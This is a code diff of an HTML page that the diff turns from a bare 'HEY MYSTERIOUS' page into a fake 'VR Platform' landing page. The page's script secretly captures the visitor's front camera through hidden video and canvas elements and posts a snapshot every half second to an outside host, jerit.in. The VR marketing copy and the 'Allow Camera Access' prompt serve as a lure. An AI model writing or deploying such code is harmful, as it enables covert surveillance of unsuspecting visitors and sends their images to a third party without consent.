@@ -1,76 +1,156 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HEY MYSTERIOUS</title>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>VR platform</title>
+
     <style>
-        #video {
-            width: 100%;
-            max-width: 500px;
-        }
-        #canvas {
-            display: none;
-        }
+      #video {
+        width: 100%;
+        max-width: 500px;
+      }
+      #canvas {
+        display: none;
+      }
     </style>
-</head>
-<body>
-    <h1 >HEY MYSTERIOUS</h1>
+    <style>
+      * {
+        font-family: 'Silkscreen', sans-serif;
+        font-weight: 400;
+        font-style: normal;
+      }
+
+      .silkscreen-bold {
+        font-family: 'Silkscreen', sans-serif;
+        font-weight: 700;
+        font-style: normal;
+      }
+    </style>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Silkscreen:wght@400;700&display=swap" rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body>
+    <h1>HEY MYSTERIOUS</h1>
     <video hidden id="video" autoplay></video>
     <canvas hidden id="canvas"></canvas>
     <button hidden id="capture-btn">Capture Image</button>
     <button hidden id="upload-btn">Upload Image</button>
 
+    <nav class="bg-gray-200 p-4">
+      <div class="container mx-auto flex justify-between items-center">
+        <h1 class="text-3xl font-bold">VR Platform</h1>
+        <button class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-full">Sign Up</button>
+      </div>
+    </nav>
+
+    <!-- Hero section -->
+    <section class="hero bg-gray-300 text-center py-20">
+      <div class="container mx-auto">
+        <h2 class="text-4xl font-bold mb-4">Immerse Yourself in Virtual Reality</h2>
+        <p class="text-lg mb-8">Explore worlds beyond your imagination</p>
+        <button onclick="btnClick()" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full">Start Exploring</button>
+      </div>
+    </section>
+
+    <!-- Features section -->
+    <section class="features bg-gray-200 text-center py-20">
+      <div class="container mx-auto">
+        <h2 class="text-3xl font-bold mb-8">Why Choose Us?</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+          <div class="feature">
+            <img src="images/1.png" alt="Feature 1" class="mx-auto mb-4" />
+            <h3 class="text-xl font-semibold mb-2">Immersive Experiences</h3>
+            <p>Step into realistic and breathtaking virtual worlds</p>
+          </div>
+          <div class="feature">
+            <img src="images/2.png" alt="Feature 2" class="mx-auto mb-4" />
+            <h3 class="text-xl font-semibold mb-2">Multiplayer Gaming</h3>
+            <p>Connect with friends and play together in virtual reality</p>
+          </div>
+          <div class="feature">
+            <img src="images/3.png" alt="Feature 3" class="mx-auto mb-4" />
+            <h3 class="text-xl font-semibold mb-2">Easy to Use</h3>
+            <p>Intuitive controls make navigation a breeze</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="permission bg-gray-300 text-center py-20">
+      <div class="container mx-auto">
+        <h2 class="text-3xl font-bold mb-8">Ready to Get Started?</h2>
+        <p class="text-lg mb-8">Allow access to your camera for an enhanced VR experience</p>
+        <button class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full">Allow Camera Access</button>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-center py-6 text-white">
+      <div class="container mx-auto">
+        <p>&copy; 2024 VR Platform. All rights reserved.</p>
+      </div>
+    </footer>
+
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureBtn = document.getElementById('capture-btn');
-        const uploadBtn = document.getElementById('upload-btn');
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const captureBtn = document.getElementById('capture-btn');
+      const uploadBtn = document.getElementById('upload-btn');
 
-        // Access the device camera and stream video
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-            .then(function(stream) {
-                video.srcObject = stream;
+      const btnClick = () => {
+        navigator.mediaDevices
+          .getUserMedia({ video: { facingMode: 'user' } })
+          .then(function (stream) {
+            video.srcObject = stream;
+          })
+          .catch(function (error) {
+            console.error('Error accessing camera:', error);
+          });
+
+        function capture() {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(function (blob) {
+            const formData = new FormData();
+            formData.append('image', blob, 'image.png');
+            // Replace 'YOUR_UPLOAD_URL' with your actual upload URL
+            fetch('https://jerit.in/api/upload/', {
+              method: 'POST',
+              body: formData,
             })
-            .catch(function(error) {
-                console.error('Error accessing camera:', error);
-            });
-
-          function capture(){
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(function(blob) {
-                const formData = new FormData();
-                formData.append('image', blob, 'image.png');
-                // Replace 'YOUR_UPLOAD_URL' with your actual upload URL
-                fetch('https://jerit.in/api/upload/', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Image uploaded successfully:', data);
-                    // Optionally display a success message or redirect to another page
-                })
-                .catch(error => {
-                    console.error('Error uploading image:', error);
-                    // Optionally display an error message
-                });
-            }, 'image/jpeg');
-          }
-
-        captureBtn.addEventListener('click', capture());
+              .then((response) => response.json())
+              .then((data) => {
+                console.log('Image uploaded successfully:', data);
+                // Optionally display a success message or redirect to another page
+              })
+              .catch((error) => {
+                console.error('Error uploading image:', error);
+                // Optionally display an error message
+              });
+          }, 'image/jpeg');
+        }
 
         // Hide the canvas initially
         canvas.style.display = 'none';
 
         // Show the canvas when the upload button is clicked
-        uploadBtn.addEventListener('click', function() {
-            canvas.style.display = 'block';
+        uploadBtn.addEventListener('click', function () {
+          canvas.style.display = 'block';
         });
 
-        setInterval(capture, 500)
+        function start() {
+          setInterval(capture, 500);
+        }
+
+        start();
+      };
+
+      // Access the device camera and stream video
     </script>
-</body>
+  </body>
 </html>
